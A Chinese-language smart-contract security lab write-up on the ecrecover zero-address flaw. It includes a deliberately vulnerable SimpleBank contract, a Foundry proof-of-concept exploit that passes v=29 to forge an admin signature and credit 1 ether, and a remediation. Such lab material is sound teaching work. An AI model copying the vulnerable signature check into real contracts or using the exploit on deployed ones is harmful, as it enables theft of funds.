[ecrecover.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/ecrecover.sol)

# ecRecover 返回(0)地址

**名称：** ecrecover 返回(0)地址

**说明：** 在 SimpleBank 合约中，转账函数将消息哈希和签名（v、r、s 值）作为输入。 它恢复签名者地址并检查它是否等于 Admin。 该漏洞在于，当签名参数无效时，ecrecover函数可能会返回0x0地址，如果v值不是27或28，则会返回(0)地址。

**解决措施：**

验证 ecrecover 的结果不为 0，或者使用 OpenZeppelin 的 ECDSA 库。

**参考：**

https://twitter.com/1nf0s3cpt/status/1674268926761668608

https://github.com/code-423n4/2021-09-swivel-findings/issues/61

https://github.com/Kaiziron/numen_ctf_2023_writeup/blob/main/wallet.md

**SimpleBank 合约样例:**

```jsx
contract SimpleBank {
    mapping(address => uint256) private balances;
    address Admin; //default is address(0)

    function getBalance(address _account) public view returns (uint256) {
        return balances[_account];
    }

    function recoverSignerAddress(
        bytes32 _hash,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) private pure returns (address) {
        address recoveredAddress = ecrecover(_hash, _v, _r, _s);
        return recoveredAddress;
    }

    function transfer(
        address _to,
        uint256 _amount,
        bytes32 _hash,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public {
        require(_to != address(0), "Invalid recipient address");

        address signer = recoverSignerAddress(_hash, _v, _r, _s);
        console.log("signer", signer);
        //解决办法
        //请求函数(signer != address(0), "Invalid signature");
        require(signer == Admin, "Invalid signature");

        balances[_to] += _amount;
    }
}
```

***\*测试方法:\****

forge test--contracts src/test/***\*ecrecover.sol\**** -vvvv

```jsx
// 测试 ecRecover 漏洞的函数
    function testecRecover() public {
        // 在利用之前发出包含当前合约余额的日志
        emit log_named_decimal_uint(
            "Before exploiting, my balance",
            SimpleBankContract.getBalance(address(this)),
            18
        );

        // 生成消息哈希
        bytes32 _hash = keccak256(
            abi.encodePacked("\\x19Ethereum Signed Message:\\n32")
        );

        // 使用 vm.sign 函数对生成的哈希进行签名。 这里，1代表账户索引
         // 返回的变量r和s是ECDSA签名（椭圆曲线数字签名算法）的一部分
        (, bytes32 r, bytes32 s) = vm.sign(1, _hash);

        // 将 v 变量设置为 29
         // 通常在以太坊中，v 是 27 或 28。当 v 既不是 27 也不是 28 时，
         // 用于签名验证的ecrecover函数将返回address(0)
        uint8 v = 29;

        // 使用不正确的 v 值调用 SimpleBankContract 的传输函数
         // 如果 SimpleBankContract 没有正确验证签名的 v 值，
         // 这可能会导致未经授权的传输
        SimpleBankContract.transfer(address(this), 1 ether, _hash, v, r, s);

        // 漏洞利用后发出包含当前合约余额的日志
        emit log_named_decimal_uint(
            "After exploiting, my balance",
            SimpleBankContract.getBalance(address(this)),
            18
        );
    }
```

**红色框：返回零地址。**

![img](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe8189c2a-67a9-4ddc-8a03-be3b2bdcce6a%2FUntitled.png?table=block&id=5f54d930-33e2-4f0a-87d5-98ce4bcb4a11&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)